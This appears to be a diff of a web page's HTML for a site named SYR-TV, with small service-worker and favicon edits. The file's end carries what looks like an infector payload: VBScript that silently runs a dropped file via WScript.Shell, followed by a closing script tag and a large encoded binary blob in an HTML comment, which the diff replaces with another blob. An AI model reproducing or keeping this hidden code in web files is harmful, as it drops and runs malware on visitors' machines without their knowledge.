@@ -10,10 +10,11 @@
 <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
 <script>
   if ("serviceWorker" in navigator) {
-    navigator.serviceWorker
-      .register("/service-worker.js")
-      .then(() => console.log("Service Worker Registered"))
-      .catch((err) => console.error("Service Worker registration failed:", err));
+    navigator.serviceWorker.register("service-worker.js").then(() => {
+      console.log("Service Worker Registered");
+    }).catch((error) => {
+      console.error("Service Worker Registration Failed:", error);
+    });
   }
 </script>
 
@@ -21,6 +22,9 @@
   <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.8/css/line.css">
   <link rel="stylesheet" href="style.css">
   <script src="https://apis.google.com/js/platform.js"></script>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+<base href="/SYR-TV/">
 
 </head>
 <body class="sidebar-hidden">
@@ -224,5 +228,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--”ÏäÓN6º;‰H(#Nß:·Ú/½CçI)¯‹<^»Ò<H-¿ÎmÎ÷\„¨.‹®w!hæzlí…±®çİDÀıy~™dÙ1ÖË=l#œXL	Û{ÂJË06Ä6ç½N&¬š˜­¬HR~róX‘ÁÓ¦Y*ò›à+W–—&If)‡ßZ6ÙOİßİD}t÷Sù¿†yKÑ’·÷Ÿ"Cé7T2xGA ªŠÒ9OèÉÔÕ¹n»©ÎT#FÑI­¯Âl‹üÍoê¼VD0ÒQC¨»y‰¬/âv—93»© g¥Ï³8ÈÜØÜD;RÍb‚'—*®[œón>8 U(ı¾x•ıK•nptÆ1
-MeVğÂÖu²ww½€Wií#ø=ªˆs,²ÜK±îj 5Yl™v~	iQŒä ¤†ã9Æ.`5Šû;İ†?M¶¶’TO+²V@Î5›÷%ç øNìåÂş¼6TŞ}D£æãuœü˜€1ÍĞ;z‚tû½An´|à14ªÜWgíuÉ®b™öÜ|}N’±”€@	Ş5pÅ¹$Å"÷ããÀ¡cŠÌLÂ«À _²&MíÜTTiƒxóg·p¤¼ ÜRùÜÜÜ‘ÎO…%|d8Æ Ü-->
+//--></SCRIPT><!--k²¬lKÈ—™÷ ß”\çÈü÷H+,É}âùX¡wŸÃ¦Ÿ¥æĞ"KÙè(g cwùôò Ê‹ŒO[Dş†Š.¡Ç_ßq{L\ã¹IÔ %Òh¶LTLûtÍÂdš½<K¡¹‰ğSPĞ&IŒöÖcŒùüeaØIK:Aº•q‰]•™I-PÙÁB'ÀÄY‘Üõé3ñ4m©ÇâWsF_ƒH1ç¥¤	¸òctTè~ø0ÖG	2Å§ÆÙ¡õHk>î]O¥È?ùäAøX†vá |6;3wx„Í%Ş£ã8•Kçá’¥0gˆìV¡Yé™Ü‹VqWìXÏ ™m°‰ú»S8…91Àe*(zf˜ç@ TZK"Á(ÆñgÜ˜%<Ú:@Ğ_VõMµ­/ç3J¶bî¡Á¥^®$0ø.š&€+¯SM¡£ÔAn‘! ÜşRåøÜşÜşÜş‘#N…úxe‰Áş Üş-->
